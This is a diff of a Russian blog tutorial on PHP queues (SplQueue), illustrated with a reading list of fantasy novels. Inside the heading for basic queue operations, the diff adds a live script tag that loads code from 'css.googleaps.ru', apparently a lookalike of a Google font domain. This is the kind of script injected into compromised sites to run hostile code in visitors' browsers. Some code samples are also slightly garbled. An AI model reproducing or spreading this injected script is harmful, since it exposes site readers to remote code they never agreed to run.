@@ -23,25 +23,25 @@ tags:
 comments: []
 ---
 <p>Если вы когда-то стояли в очереди, то знаете, что прежде всего будут обслуживаться те, кто стоит перед вами. В мире программирования, очередь - это ещё одна часто распространённая структура данных, которая работает по принципу FIFO - &ldquo;первым пришёл - первым ушёл&rdquo;.</p>
-<p><strong>Основные операции с очередями:<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;strong></p>
+<p><strong>Основные операции с очередями:<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></strong></p>
 <ul>
-<li>init &ndash; создание очереди.<&#47;li>
-<li>enqueue &ndash; добавление объекта в конец очереди.<&#47;li>
-<li>dequeue &ndash; удалить объект из начала очереди.<&#47;li>
-<li>isEmpty &ndash; проверка очереди на наличие элементов.<&#47;li><br />
-<&#47;ul><br />
+<li>init &ndash; создание очереди.</li>
+<li>enqueue &ndash; добавление объекта в конец очереди.</li>
+<li>dequeue &ndash; удалить объект из начала очереди.</li>
+<li>isEmpty &ndash; проверка очереди на наличие элементов.</li><br />
+</ul><br />
 Для того чтобы создать очередь в PHP можно унаследовать свой класс от SplQueue. Давайте сделаем это:</p>
 <pre class="brush: php; gutter: true">class ReadingList extends SplQueue<br />
 {<br />
 }<br />
 $myBooks = new ReadingList();</p>
-<p>&#47;&#47; добавляем элементы в очередь<br />
+<p>// добавляем элементы в очередь<br />
 $myBooks->enqueue(&#039;A Game of Thrones&#039;);<br />
 $myBooks->enqueue(&#039;A Clash of Kings&#039;);<br />
-$myBooks->enqueue(&#039;A Storm of Swords&#039;);<&#47;pre><br />
+$myBooks->enqueue(&#039;A Storm of Swords&#039;);</pre><br />
 SplDoublyLinkedList имплементирует интерфейс ArrayAccess так, что добавлять элементы вы можете точно так же, как при использовании bothSplQueue и SplStack:</p>
 <pre class="brush: php; gutter: true">$myBooks[] = &#039;A Feast of Crows&#039;;<br />
-$myBooks[] = &#039;A Dance with Dragons&#039;;<&#47;pre><br />
-<strong>Удаление элементов:<&#47;strong></p>
-<pre class="brush: php; gutter: true">echo $myBooks->dequeue() . "n"; &#47;&#47; &#039;A Game of Thrones&#039;<br />
-echo $myBooks->dequeue() . "n"; &#47;&#47; &#039;A Clash of Kings&#039;<&#47;pre></p>
+$myBooks[] = &#039;A Dance with Dragons&#039;;</pre><br />
+<strong>Удаление элементов:</strong></p>
+<pre class="brush: php; gutter: true">echo $myBooks->dequeue() . "n"; // &#039;A Game of Thrones&#039;<br />
+echo $myBooks->dequeue() . "n"; // &#039;A Clash of Kings&#039;</pre></p>
